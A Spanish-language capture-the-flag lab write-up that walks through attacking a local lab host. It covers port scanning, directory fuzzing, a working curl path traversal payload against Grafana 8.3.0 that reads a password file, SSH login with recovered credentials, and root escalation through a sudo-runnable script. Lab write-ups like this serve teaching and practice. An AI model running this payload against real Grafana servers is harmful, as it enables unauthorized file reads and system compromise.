tags: #fuzzing #LFI #DPT 
____
## Reconocimiento

```bash
ping -c 1 172.17.0.2
```

![[Anexos/Pasted image 20251108121944.png]]
Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:

```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251108121832.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80,8089 -vvv -oN version 172.17.0.2
```

![[Anexos/Pasted image 20251108121920.png]]

Vemos que corren dos servicios web: uno por el puerto 80 y otro por el 3000. Después de hacer fuzzing al puerto 80, vemos lo siguiente:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,xml -o dirs.txt
```

![[Anexos/Pasted image 20251108125708.png]]

Accedemos al recurso maintenance.html y vemos lo siguiente:

![[Anexos/Pasted image 20251108125759.png]]

Ahora, viendo el servicio web que corre por el puerto 3000 vemos que se trata del servicio de grafana, y más concretamente la versión 8.3.0:

![[Anexos/Pasted image 20251108130247.png]]

Si buscamos esta versión en searchsploit podemos ver que para esta versión de grafana hay una vulnerabilidad de directory path traversal:

![[Anexos/Pasted image 20251108130353.png]]

Aunque esta opción es válida y muy buena, he encontrado otra forma de ejecutar esta vulnerabilidad a través de un plugin llamado mysql. Usando el siguiente comando desde terminal:

```bash
curl http://172.17.0.2:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fpass.txt
```

![[Anexos/Pasted image 20251108131805.png]]

También es interesante tener en cuenta el archivo passwd para enumerar usuarios, ya que tenemos el puerto 22 abierto:

![[Anexos/Pasted image 20251108131906.png]]

Vamos a probar acceder por ssh con las siguientes credenciales:

```bash
freddy:t9sH76gpQ82UFeZ3GXZS
```

![[Anexos/Pasted image 20251108132048.png]]

Ejecutando el comando sudo -l vemos que podemos ejecutar un script llamado maintenance como el usuario root, así que accedemos a el y lo modificamos con un código malicioso para dar permisos de SUID a la bash:

![[Anexos/Pasted image 20251108132312.png]]

![[Anexos/Pasted image 20251108132204.png]]

![[Anexos/Pasted image 20251108132506.png]]